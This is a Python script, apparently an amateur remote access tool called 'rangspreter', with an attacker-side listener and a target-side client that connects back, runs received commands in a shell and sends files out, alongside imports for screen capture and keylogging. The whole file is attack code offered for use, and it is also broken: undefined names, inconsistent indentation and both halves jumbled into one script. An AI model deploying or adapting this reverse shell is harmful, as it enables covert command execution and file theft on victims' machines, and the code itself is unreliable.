# i'm lazy to remove unused library/module -_-
import socket
import subprocess
from subprocess import PIPE
import json
import os
from klog import KL
import threading
import cv2
import pickle
import struct
import pyautogui
import pygame
from PIL import ImageGrab
import numpy as np

# forget this thing!
init(autoreset=True)
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('192.168.1.1', 5555))
print(Fore.GREEN + 'wait for connection ...') # helloooo, someone there?
soc.listen(1)

connection = soc.accept()
_target = connection[0]
ip = connection[0]
print(Fore.CYAN + f"{_target}")

#this is the code that target connected to attacker!
sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(('192.168.1.1', 5555))

def data_accepted():
	data = ''
	while True:
		try:
			data = data + _target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue
  
# this is download from rangspreter
def download(fname):
	file = open(fname, 'wb') # write byte or change file to a byte so make the computer easier to take the file
	_target.settimeout(1) # if nothing to take, it stop after 1 sec
	_file = _target.recv(1024) # 1024 means 1 kb
	while _file:
		file.write(_file)
		try:
			_file = _target.recv(1024)
		except socket.timeout as e:
			break 
	_target.settimeout(None) # back to do_command
	file.close()

# this is to take the downloaded file from target
def upload(fname):
	file = open(fname, 'rb') #read every byte that def download have take and arrange it like a puzzleeeeesssss
	sc.send(file.read()) #socket
	file.close #STOP!

def communicate_shell():
	n = 0
	while True:
		command = input(Fore.GREEN + 'rangspreter>> ')
		data = json.dumps(command)
		_target.send(data.encode())
		if command in ('exit', 'out'):
			break
		elif command == 'wipe':
			os.system('clear')
		elif command[:8] == 'download': #from 0 to 8
			download(command[8:]) #from 8 to infinite, or you can max it like [8:30] max file name is 30
		else:
			done = data_accepted()
			print(done)

communicate_shell()

# this is target command and this is connected to attacker or def communicate_shell()
def do_command():
	while True:
		command = accepted()
		if command in ('exit', 'out'):
			break # stop the target program, if this not break then it will stay there until you stop it using taskmgr or htop . . . i guess? 
		elif command == 'wipe':
			pass
		elif command[:8] == 'download':
			upload(command[6:])
    else:
			execute = subprocess.Popen(
									command,
									shell = True,
									stdout = PIPE,
									stderr = PIPE,
									stdin = PIPE
							)
			data = execute.stdout.read() + execute.stderr.read()
			data = data.decode()
			output = json.dumps(data)
			sc.send(output.encode())

do_command()
